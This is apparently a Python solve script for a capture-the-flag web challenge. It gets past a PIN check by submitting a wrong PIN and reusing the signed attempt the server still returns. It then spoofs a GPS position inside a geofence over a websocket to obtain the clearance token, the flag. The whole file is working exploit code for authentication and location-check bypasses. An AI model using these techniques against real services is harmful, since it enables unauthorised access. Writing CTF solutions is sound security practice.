#!/usr/bin/env python3
"""
Vicinity Wire — seized Cordon Seven station.

The PIN check is a client-side gate: /api/station/pin-check answers PIN_MISMATCH but
still hands back a signed `attempt`, and /api/station/activate accepts that attempt
without ever asking whether the PIN was correct. Activation yields the station
capability, the room name and the cordon geometry.

On the channel, the station is told to report a synthetic position outside the cordon,
which keeps it ineligible for the room. Reporting a position inside the 75 m cordon
makes the room eligible; the documented `room.join` frame then returns the snapshot
with the clearance token.

Usage: uv run --with websockets python solve_vicinity.py [base]
"""

import asyncio
import json
import sys
import time
import urllib.request

import websockets

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://w02.ctf.chronos-security.ro:33824").rstrip("/")
WS = BASE.replace("http://", "ws://").replace("https://", "wss://") + "/ws"
UA = "vicinity-station/1.0"


def api(path: str, payload: dict | None = None, cookie: str | None = None):
    data = json.dumps(payload).encode() if payload is not None else None
    headers = {"User-Agent": UA}
    if data:
        headers["Content-Type"] = "application/json"
    if cookie:
        headers["Cookie"] = cookie
    req = urllib.request.Request(BASE + path, data=data, method="POST" if data else "GET", headers=headers)
    with urllib.request.urlopen(req, timeout=15) as resp:
        return resp.read().decode(), (resp.headers.get_all("Set-Cookie") or [])


def activate() -> tuple[str, dict]:
    _, cookies = api("/")                                   # issues the `station` session cookie
    cookie = cookies[0].split(";")[0]
    body, _ = api("/api/station/pin-check", {"pin": "000000"}, cookie)   # wrong PIN on purpose
    check = json.loads(body)
    print("[pin    ] success=%s code=%s attempt issued=%s"
          % (check["success"], check["code"], bool(check.get("attempt"))))
    body, _ = api("/api/station/activate", {"attempt": check["attempt"]}, cookie)
    station = json.loads(body)
    print("[activate] success=%s room=%s cap=%s… centre=%.6f,%.6f r=%dm"
          % (station["success"], station["room"], station["cap"][:8],
             station["lat_e6"] / 1e6, station["lon_e6"] / 1e6, station["radius_m"]))
    return cookie, station


async def channel(cookie: str, station: dict, lat: float, lon: float) -> dict:
    result = {}
    async with websockets.connect(WS, additional_headers={"Cookie": cookie}) as ws:
        seq = 1
        await ws.send(json.dumps({"type": "station.authenticate", "sequence": seq, "cap": station["cap"]}))
        while True:
            msg = json.loads(await asyncio.wait_for(ws.recv(), timeout=10))
            if isinstance(msg.get("next_sequence"), int):
                seq = msg["next_sequence"]
            if msg["type"] == "station.accepted":
                print("[channel] authenticated: freshness=%dms eligibility=%dms limit=%d/%dms"
                      % (msg["freshness_ms"], msg["eligibility_ttl_ms"], msg["limit"], msg["window_ms"]))
                await ws.send(json.dumps({"type": "position.update", "sequence": seq,
                                          "observed_at_ms": int(time.time() * 1000),
                                          "latitude": lat, "longitude": lon, "accuracy_m": 5.0}))
                seq += 1
            elif msg["type"] == "position.accepted":
                result["position"] = msg
                print("[position] inside=%s distance=%.1fm eligible_room=%s"
                      % (msg["inside"], msg["distance_m"], msg["eligible_room"]))
                await ws.send(json.dumps({"type": "room.join", "sequence": seq, "room": station["room"]}))
                seq += 1
            elif msg["type"] == "room.snapshot":
                print("[room    ] %s | %s" % (msg["classification"], msg["briefing"]))
                result["snapshot"] = msg
                break
            elif msg["type"] == "error":
                result["error"] = msg
                print("[error  ] %s for sequence %s" % (msg["code"], msg["for_sequence"]))
                break
    return result


async def main() -> int:
    cookie, station = activate()
    # negative control: the position the app is scripted to report (outside the cordon)
    outside = await channel(cookie, station, -47.200610, -126.302400)
    print("[control] outside report -> inside=%s eligible_room=%s error=%s"
          % (outside.get("position", {}).get("inside"),
             outside.get("position", {}).get("eligible_room"),
             outside.get("error", {}).get("code")))
    # exploit: report a position inside the cordon centre
    inside = await channel(cookie, station, station["lat_e6"] / 1e6, station["lon_e6"] / 1e6)
    snap = inside.get("snapshot")
    if snap:
        print("[flag   ] %s" % snap["clearance_token"])
        return 0
    return 1


raise SystemExit(asyncio.run(main()))
